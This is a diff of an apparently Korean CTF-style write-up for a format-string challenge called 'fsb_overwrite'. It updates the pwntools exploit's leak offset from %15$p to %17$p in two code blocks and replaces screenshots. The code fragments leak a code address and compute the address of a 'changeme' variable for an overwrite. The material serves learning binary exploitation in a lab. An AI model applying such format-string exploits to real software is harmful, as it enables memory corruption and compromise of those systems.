@@ -119,7 +119,7 @@ p = process('./fsb_overwrite')
 elf = ELF('./fsb_overwrite')
 
 # [1] Get Address of changeme
-p.sendline(b'%15$p') # FSB
+p.sendline(b'%17$p') # FSB
 leaked = int(p.recvline()[:-1], 16)
 code_base = leaked - 0x1293
 changeme = code_base + elf.symbols['changeme']
@@ -129,7 +129,6 @@ slog('changeme', changeme)
 ```
 
 
-<img width="821" height="536" alt="image" src="https://github.com/user-attachments/assets/892db3b8-742e-44e7-80c2-baf90e86ce17" />
 
 
 ### 1337 길이의 문자열 출력
@@ -159,7 +158,7 @@ p = process('./fsb_overwrite')
 elf = ELF('./fsb_overwrite')
 
 # [1] Get Address of changeme
-p.sendline(b'%15$p') # FSB
+p.sendline(b'%17$p') # FSB
 leaked = int(p.recvline()[:-1], 16)
 code_base = leaked - 0x1293
 changeme = code_base + elf.symbols['changeme']
@@ -179,4 +178,5 @@ p.interactive()
 ```
 
 
-<img width="811" height="428" alt="image" src="https://github.com/user-attachments/assets/ff81e231-0b9e-4ca5-a74c-e125e5e6c3cd" />
+<img width="776" height="660" alt="image" src="https://github.com/user-attachments/assets/7619c4d6-2a17-425c-a2cb-1080d2582c4a" />
+
